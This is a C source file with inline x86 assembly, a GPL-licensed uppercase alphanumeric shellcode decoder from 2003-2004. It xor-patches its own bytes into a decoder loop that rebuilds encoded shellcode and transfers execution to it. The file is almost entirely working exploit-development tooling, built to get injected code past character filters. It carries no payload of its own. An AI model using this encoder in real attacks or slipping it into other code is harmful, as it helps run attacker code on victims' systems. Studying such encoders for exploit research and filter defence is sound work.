/*
  Uppercase, alphanumeric, shellcode decoder.
  (C) Copyright 2003, 2004 Berend-Jan Wever

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

  Thanks to rix for his phrack article on aphanumeric shellcode.

  Pre-execution requirements:
    %ecx = %edx = baseaddress of code.
  Short description:
    The code will "xor-patch" it's own last bytes into a decoder loop, this
    decoder loop will then convert the string behind it from alphanumeric
    characters back to the origional shellcode untill it reaches the
    character 'A'. Execution is then transfered to the decoded shellcode.
  Encoding scheme for origional shellcode:
    Every byte 0xAB is encoded in two bytes:  0xCD and 0xEF
    Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric,
    D = A^E and C is arbitrary (3-7) as long as CD is alphanumeric.
    The encoded data is terminated by a "A" (0x41) character, DO NOT USE THIS
    in your encoded shellcode data, as it will stop the decoding!
*/


int main(void) {
  __asm__(
    // output the code to stdout
      "  mov     $end-start, %edx       \n" // length
      "  mov     $start, %ecx           \n" // source
      "  mov     $0x1, %ebx             \n" // stdout
      "  mov     $0x4, %eax             \n" // write
      "  int     $0x80                  \n"
      "  jmp     end                    \n"
    "start:                             \n"

      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"
      "  aaa                            \n"

// Get a 0x0 in a register ----------------------------------------------------
      "  push     %esi                  \n"
      "  push     %esp                  \n"
      "  pop      %eax                  \n" // eax -> esi on stack
      "  xor      (%eax), %esi          \n" // esi = 0

// XOR-patching ---------------------------------------------------------------
      "  push     %esi                  \n"
      "  pop      %eax                  \n"
      "  xor      $0x41, %al            \n" // al = 41
      "  push     %eax                  \n"
      "  xor      %al, 0x33(%ecx)       \n" // decode 0x10 for imul instruction
      "  dec      %eax                  \n" // al = 40
      "  dec      %eax                  \n" // al = 3F
      "  xor      %al, 0x30(%ecx)       \n" // decode 0x6b for imul instruction
      "  xor      %al, 0x42(%ecx)       \n" // decode 0x75 for jne instruction

      // loop:
      "  inc      %ecx                  \n" 
      "  inc      %ecx                  \n" 
      "  inc      %edx                  \n" 
      " .byte 0x54, 0x41, 0x41, 0x51    \n" // 6B41 42 10      IMUL    EAX, [ECX+42], 10
      "  xor      0x42(%ecx), %al       \n" // al = decoded byte
      "  xor      0x42(%edx), %al       \n"
      "  xor      %al, 0x42(%edx)       \n" // destination = decoded byte
      "  pop      %eax                  \n"
      "  push     %eax                  \n"
      "  cmp      %al, 0x43(%ecx)       \n"
      " .byte     0x4A, 0x4A, 0x49      \n" // 75 E9           JNZ   loop
//      " .byte     0x48, 0x4C            \n" // CC              INT   3
//      " .byte     0x41                  \n" // terminator
      "end:                             \n"
  );
 exit(0);
}
